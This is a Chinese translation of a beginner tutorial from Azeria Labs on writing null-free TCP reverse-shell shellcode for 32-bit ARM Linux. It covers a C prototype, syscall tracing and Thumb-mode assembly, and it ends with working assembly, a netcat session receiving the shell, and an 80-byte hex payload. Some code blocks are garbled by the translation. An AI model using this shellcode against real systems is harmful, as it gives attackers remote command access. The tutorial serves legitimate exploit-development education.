# 用ARM编写TCP Reverse Shell

阅读量 **395385**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-03-28 15:30:13

 **x**

##### 译文声明

本文是翻译文章，文章原作者 azeria-labs，文章来源：azeria-labs.com

原文地址：<https://azeria-labs.com/tcp-reverse-shell-in-assembly-arm-32-bit>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01aa05e066dfbd4638.jpg)

在本教程中，你将学习如何编写没有空字节的TCP反向shellcode。如果你想从小处开始，你可以学习如何在汇编中编写一个[简单的execve（）shell](https://azeria-labs.com/writing-arm-shellcode/)，然后再深入研究这个稍微更广泛的教程。如果你需要重新了解Arm，请查看我的[ARM
Assembly Basics](https://azeria-labs.com/writing-arm-assembly-part-1/)教程系列，或者使用以下备忘单（[点击查看大图](https://s2.ax1x.com/2019/03/26/AUfVp9.png)）：

![](https://s2.ax1x.com/2019/03/26/AUfkY4.png)

在开始之前，我想提醒你，你正在创建ARM
shellcode，因此如果你还没有ARM实验环境，则需要建立一个环境。你可以自己搭建（[使用QEMU模拟Raspberry
Pi](https://azeria-labs.com/emulate-raspberry-pi-with-qemu/)）或节省时间并下载我创建的现成的Lab VM（[ARM Lab VM](https://azeria-labs.com/arm-lab-vm/)）。

## 开始：了解反向shell

首先，什么是反向shell？它是如何工作的？反向shell强制内部系统主动连接到外部系统。在这种情况下，你的机器有一个监听端口，它在该端口上接收从目标系统返回的连接。

![](https://s2.ax1x.com/2019/03/26/AUWxln.png)

由于目标网络的防火墙更难以阻止传出连接，因此可以通过使用反向shell（与bind shell相反，bind
shell要求在目标系统上允许传入连接）来利用这种错误配置 。

这是我们将解释的C语言代码。

    
    
    #include <stdio.h>
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    
    int main(void)
    {
     int sockfd; // socket file descriptor
     socklen_t socklen; // socket-length for new connections
    
     struct sockaddr_in addr; // client address
    
     addr.sin_family = AF_INET; // server socket type address family = internet protocol address
     addr.sin_port = htons( 1337 ); // connect-back port, converted to network byte order
     addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // connect-back ip , converted to network byte order
    
     // create new TCP socket
     sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
    
     // connect socket
     connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    
     //  Duplicate file descriptors for STDIN, STDOUT and STDERR
     dup2(sockfd, 0);
     dup2(sockfd, 1);
     dup2(sockfd, 2);
    
     // spawn shell
     execve( "/bin/sh", NULL, NULL );
    }
    

## 第一阶段：系统功能及其参数

第一步是确定必要的系统功能、参数和系统调用号。查看上面的代码，我们可以看到我们需要以下函数：socket，connect，dup2，execve。你可以使用以下命令计算出这些函数的系统调用号：

    
    
    pi @ raspberrypi：〜/ bindshell $ cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep socket
    #define __NR_socketcall（__ NR_SYSCALL_BASE + 102）
    #define __NR_socket（__ NR_SYSCALL_BASE + 281）
    #define __NR_socketpair（__ NR_SYSCALL_BASE + 288）
    #undef __NR_socketcall
    

这些是我们需要的所有系统调用号码：

    
    
    #define __NR_socket    (__NR_SYSCALL_BASE+281)
    #define __NR_connect   (__NR_SYSCALL_BASE+283)
    #define __NR_dup2      (__NR_SYSCALL_BASE+ 63)
    #define __NR_execve    (__NR_SYSCALL_BASE+ 11)
    

每个函数所需的参数可以在[linux手册页](http://man7.org/linux/man-pages/index.html)或[w3challs.com](https://w3challs.com/syscalls/?arch=arm_strong)上[查找](https://w3challs.com/syscalls/?arch=arm_strong)。

Function | R7 | R0 | R1 | R2  
---|---|---|---|---  
Socket | 281 | int socket_family | int socket_type | int protocol  
Connect | 283 | int sockfd | const struct sockaddr *addr | socklen_t addrlen  
Dup2 | 63 | int oldfd | int newfd | –  
Execve | 11 | const char *filename | char *const argv[] | char *const envp[]  
  
下一步是弄清楚这些参数的具体值。一种方法是使用strace查看成功的反向shell连接。Strace是一种工具，可用于跟踪系统调用并监视进程与Linux内核之间的交互。让我们使用strace来测试我们的正向shell的C版本。为了减少干扰，我们将输出限制在我们感兴趣的功能范围内。

    
    
    Terminal 1:
    pi@raspberrypi:~/reverseshell $ gcc reverse.c -o reverse
    pi@raspberrypi:~/reverseshell $ strace -e execve,socket,connect,dup2 ./reverse
    
    
    
    Terminal 2:
    user@ubuntu:~$ nc -lvvp 4444
    Listening on [0.0.0.0] (family 0, port 4444)
    Connection from [192.168.139.130] port 4444 [tcp/*] accepted (family 2, sport 38010)
    

这是我们的strace输出：

    
    
    pi @ raspberrypi：〜/ reverseshell $ strace -e execve，socket，connect，dup2 ./reverse
    execve（“./ reverse”，[“。/ reverse”]，[/ * 49 vars * /]）= 0
    socket（PF_INET，SOCK_STREAM，IPPROTO_IP）= 3
    connect（3，{sa_family = AF_INET，sin_port = htons（4444），sin_addr = inet_addr（“192.168.139.130”）}，16）= 0
    dup2（3,0）= 0
    dup2（3,1）= 1
    dup2（3,2）= 2
    execve（“/ bin / sh”，[0]，[/ * 0 vars * /]）= 0
    

现在我们可以填补空白并记下我们需要传递给程序集bind shell函数的值。

Function | R7 | R0 | R1 | R2  
---|---|---|---|---  
Socket | 281 | 2 | 1 | 0  
Connect | 283 | sockid | (struct sockaddr*) &addr | 16  
Dup2 | 63 | sockid | 0 / 1 / 2 | –  
Execve | 11 | “/bin/sh” | 0 | 0  
  
## 第二阶段：逐步解释

在第一阶段，我们回答了以下问题，以获得我们的装配程序所需的一切：

  1. 我需要哪些功能？
  2. 这些功能的系统调用号是什么？
  3. 这些函数的参数是什么？
  4. 这些参数的值是什么？

将每个函数拆分为单独的块并重复以下过程：

  1. 找出要用于哪个参数的寄存器
  2. 弄清楚如何将所需的值传递给这些寄存器 
    1. 如何将即时值传递给寄存器
    2. 如何在不直接将＃0移入其中的情况下使寄存器无效（我们需要在代码中避免使用空字节，因此必须找到其他方法来使寄存器或内存中的值无效）
    3. 如何使寄存器指向存储器中存储常量和字符串的区域

使用正确的系统调用号来调用该函数并跟踪寄存器内容的更改

  1. 请记住，系统调用的结果将落在r0中，这意味着如果需要在另一个函数中重用该函数的结果，则需要在调用函数之前将其保存到另一个寄存器中。
  2. 示例： **sockfd = socket（** 2,1,0） – ？？?socket的结果（sockfd）将落在r0中。此结果在 **dup2（sockid，0）** 等其他函数中重用，因此应保存在另一个寄存器中。

###  0 – 切换到Thumb模式

要降低遇到空字节的可能性，首先应该使用Thumb模式。在Arm模式下，指令为32位，在Thumb模式下，指令为16位。这意味着我们可以通过简单地减小指令的大小来减少使用空字节的可能。如何切换到Thumb模式：ARM指令必须是4字节对齐的。要将模式从ARM更改为Thumb，请将下一条指令地址（在PC中找到）的LSB（最低有效位）设置为1，方法是将PC寄存器的值加1并将其保存到另一个寄存器。然后使用BX（分支和交换）指令分支到另一个寄存器，该寄存器包含LSB设置为1的下一条指令的地址，这使得处理器切换到Thumb模式。这一切都可以归结为以下两条说明。

    
    
    .section .text
    .global _start
    _start:
        .ARM
        add     r3, pc, #1            
        bx      r3
    

![](https://s2.ax1x.com/2019/03/26/AUWoOP.md.png)

从这里开始你将编写Thumb代码，因此需要在代码中使用THUMB指令。

###  1 – 创建新Socket

![](https://s2.ax1x.com/2019/03/26/AUWbTS.png)

这些是socket调用参数所需的值：

    
    
    root@raspberrypi:/home/pi# grep -R "AF_INET|PF_INET |SOCK_STREAM =|IPPROTO_IP =" /usr/include/
    /usr/include/linux/in.h: IPPROTO_IP = 0,                               // Dummy protocol for TCP 
    /usr/include/arm-linux-gnueabihf/bits/socket_type.h: SOCK_STREAM = 1,  // Sequenced, reliable, connection-based
    /usr/include/arm-linux-gnueabihf/bits/socket.h:#define PF_INET 2       // IP protocol family. 
    /usr/include/arm-linux-gnueabihf/bits/socket.h:#define AF_INET PF_INET
    

设置参数后，使用svc指令进行socket 系统调用。这个调用的结果将是我们的 **sockid**
并将最终落在r0。既然我们以后需要sockid，就把它保存到r4吧。

在ARMv7+中，您可以使用movw指令，并将任何即时值输入寄存器。在ARMv6中，不能简单地将任何直接值移动到寄存器中，而必须将其分成两个较小的值。如果你对这个细微差别的更多细节感兴趣，可以在[Memory
Instructions](https://azeria-labs.com/memory-instructions-load-and-store-part-4/) ]章节（最后）中找到一节。

为了检查我是否可以使用某个即时值，我写了一个名为[rotator.py](https://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py)的小脚本。

    
    
    pi@raspberrypi:~ $ python rotator.py
    Enter the value you want to check: 281
    Sorry, 281 cannot be used as an immediate number and has to be split.
    
    pi@raspberrypi:~ $ python rotator.py
    Enter the value you want to check: 200
    The number 200 can be used as a valid immediate number.
    50 ror 30 --> 200
    
    pi@raspberrypi:~ $ python rotator.py
    Enter the value you want to check: 81
    The number 81 can be used as a valid immediate number.
    81 ror 0 --> 81
    

最终代码段（ARMv6版本）：

    
    
      .THUMB
        mov     r0, #2
        mov     r1, #1
        sub     r2, r2
        mov     r7, #200
        add     r7, #81                // r7 = 281 (socket syscall number) 
        svc     #1                     // r0 = sockid value 
        mov     r4, r0                 // save sockid in r4
    

###  2 – 连接

![](https://s2.ax1x.com/2019/03/26/AUWLFg.png)

用第一条指令，我们将存储在文字池中的结构对象（包含地址族，主机端口和主机地址）的地址放入R0。文字池是存储常量，字符串或偏移量的同一部分中的内存区域（因为文字池是代码的一部分）。你可以使用带标签的ADR指令，而不是手动计算pc相对偏移量。ADR接受PC相对表达式，即带有可选偏移量的标签，其中标签的地址相对于PC标签。像这样：

    
    
    // connect(r0, &sockaddr, 16)
     adr r1, struct         // pointer to struct
     [...]
    struct:
    .ascii "x02xff"       // AF_INET 0xff will be NULLed 
    .ascii "x11x5c"       // port number 4444 
    .byte 192,168,139,130   // IP Address
    

在第一条指令中，我们将R1指向存储区域，在该区域中存储地址族AF_INET，我们要使用的本地端口和IP地址的值。STRB指令用x00替换 x02
xff中的占位符xff，将AF_INET设置为 x02 x00。

STRB指令将一个字节从寄存器存储到计算的存储区域。语法[r1，＃1]表示我们将R1作为基址，将即时值（＃1）作为偏移量。我们怎么知道它是一个空字节存储？因为r2仅由于清除寄存器的“sub
r2，r2，r2”指令而包含0。

move指令将sockaddr结构的长度（AF_INET为2个字节，PORT为2个字节，ipaddress为4个字节，8个字节填充=
16个字节）放入r2。然后，我们将r7设置为283，只需向其中添加2，因为r7已经包含了上一次系统调用的281。

###  3 – STDIN，STDOUT，STDERR

![](https://s2.ax1x.com/2019/03/26/AUW7ef.png)

对于dup2函数，我们需要系统调用号63。需要再次将保存的sockid移入r0，并将子指令集r1设置为0。对于剩余的两个dup2调用，我们只需要在每次系统调用后将r1和r0重置为sockid。

    
    
      / * dup2（sockid，0）* / 
        mov r7，＃63 // r7 = 63（dup2系统调用号）
        mov r0，r4 // r4是保存的client_sockid 
        子r1，r1 // r1 = 0（stdin）
        svc＃ 1
    
    
    
      / * dup2（sockid，1）* / 
        mov r0，r4 // r4是保存的client_sockid 
        add r1，＃1 // r1 = 1（stdout）
        svc＃1
    
    
    
     / * dup2（sockid，2）* / 
        mov r0，r4 // r4是保存的client_sockid 
        add r1，＃1 // r1 = 1 + 1（stderr）
        svc＃1
    

###  4 – 生成Shell

![](https://s2.ax1x.com/2019/03/26/AUWHw8.png)

    
    
    // execve("/bin/sh", 0, 0) 
     adr  r0, binsh         // r0 = location of "/bin/shX"
     sub  r1, r1            // clear register r1. R1 = 0
     sub  r2, r2            // clear register r2. R2 = 0
     strb r2, [r0, #7]      // replace X with 0 in /bin/shX
     mov  r7, #11           // execve syscall number
     svc  #1
     nop                    // nop needed for alignment
    

我们在这个例子中使用的execve（）函数遵循与[编写ARM Shellcode](https://azeria-labs.com/writing-arm-shellcode/)教程相同的过程，其中所有内容都是逐步解释的。

最后，我们将值AF_INET（带有0xff，将被替换为null），端口号，IP地址和“/ bin /
shX”（带有X，将被null替换）字符串放在我们的汇编代码的末尾。

    
    
    struct_addr：
    .ascii“ x02  xff”// AF_INET 0xff将为NULL 
    .ascii“ x11  x5c”//端口号4444 
    .byte 192,168,139,130 // IP地址
    binsh：
    .ascii“/ bin / shX”
    

## 最终汇编代码

这是我们的最终bind shellcode。

    
    
    .section .text
    .global _start
    _start:
     .ARM
     add   r3, pc, #1       // switch to thumb mode 
     bx    r3
    
    .THUMB
    // socket(2, 1, 0) 
     mov   r0, #2
     mov   r1, #1
     sub   r2, r2
     mov   r7, #200
     add   r7, #81         // r7 = 281 (socket) 
     svc   #1              // r0 = resultant sockfd 
     mov   r4, r0          // save sockfd in r4 
    
    // connect(r0, &sockaddr, 16) 
     adr   r1, struct        // pointer to address, port 
     strb  r2, [r1, #1]    // write 0 for AF_INET 
     mov   r2, #16
     add   r7, #2          // r7 = 283 (connect) 
     svc   #1
    
    // dup2(sockfd, 0) 
     mov   r7, #63         // r7 = 63 (dup2) 
     mov   r0, r4          // r4 is the saved sockfd 
     sub   r1, r1          // r1 = 0 (stdin) 
     svc   #1
    // dup2(sockfd, 1) 
     mov   r0, r4          // r4 is the saved sockfd 
     mov   r1, #1          // r1 = 1 (stdout) 
     svc   #1
    // dup2(sockfd, 2) 
     mov   r0, r4         // r4 is the saved sockfd 
     mov   r1, #2         // r1 = 2 (stderr)
     svc   #1
    
    // execve("/bin/sh", 0, 0) 
     adr   r0, binsh
     sub   r2, r2
     sub   r1, r1
     strb  r2, [r0, #7]
     mov   r7, #11       // r7 = 11 (execve) 
     svc   #1
    
    struct:
    .ascii "x02xff"      // AF_INET 0xff will be NULLed 
    .ascii "x11x5c"      // port number 4444 
    .byte 192,168,139,130  // IP Address 
    binsh:
    .ascii "/bin/shX"
    

## 测试SHELLCODE

将汇编代码保存到名为reverse_shell.s的文件中。使用ld时不要忘记-N标志。这样做的原因是我们使用多个strb操作来修改我们的代码段（.text）。这要求代码段是可写的，并且可以通过在链接过程中添加-N标志来实现。

    
    
    pi@raspberrypi:~/reverseshell $ as reverse_shell.s -o reverse_shell.o && ld -N reverse_shell.o -o reverse_shell
    pi@raspberrypi:~/reverseshell $ ./reverse_shell
    

然后，连接到指定的端口：

    
    
    user@ubuntu:~$ nc -lvp 4444
    Listening on [0.0.0.0] (family 0, port 4444)
    Connection from [192.168.139.130] port 4444 [tcp/*] accepted (family 2, sport 38020)
    uname -a
    Linux raspberrypi 4.4.34+ #3 Thu Dec 1 14:44:23 IST 2016 armv6l GNU/Linux
    

奏效了。现在让我们用下面的命令把它转换成十六进制字符串：

    
    
    pi@raspberrypi:~/reverseshell $ objcopy -O binary reverse_shell reverse_shell.bin
    pi@raspberrypi:~/reverseshell $ hexdump -v -e '"\""x" 1/1 "%02x" ""' reverse_shell.bin
    x01x30x8fxe2x13xffx2fxe1x02x20x01x21x92x1axc8x27x51x37x01xdfx04x1cx0axa1x4ax70x10x22x02x37x01xdfx3fx27x20x1cx49x1ax01xdfx20x1cx01x21x01xdfx20x1cx02x21x01xdfx04xa0x52x40x49x40xc2x71x0bx27x01xdfx02xffx11x5cxc0xa8x8bx82x2fx62x69x6ex2fx73x68x58
    

这就是反向shellcode，这个shellcode长80个字节。由于这是一个初学者教程并且为了保持简单，shellcode并不尽可能短。在初始shellcode工作之后，你可以尝试找到减少指令数量的方法，从而缩短shellcode。

我希望你学到了一些东西，可以运用这些知识来编写你自己的shellcode变种。请随时与我联系以获得反馈或建议。

本文翻译自azeria-labs.com [原文链接](https://azeria-labs.com/tcp-reverse-shell-in-assembly-arm-32-bit)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **栗子** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/175470](/post/id/175470)

安全客 - 有思想的安全新媒体

本文转载自: [azeria-labs.com](https://azeria-labs.com/tcp-reverse-shell-in-assembly-arm-32-bit)

如若转载,请注明出处： <https://azeria-labs.com/tcp-reverse-shell-in-assembly-arm-32-bit>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Shell](/tag/Shell)
  * [arm](/tag/arm)

 **+1** __6赞

 __收藏

![](https://p2.ssl.qhimg.com/t011026bca225dfe5bb.jpg) 栗子

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

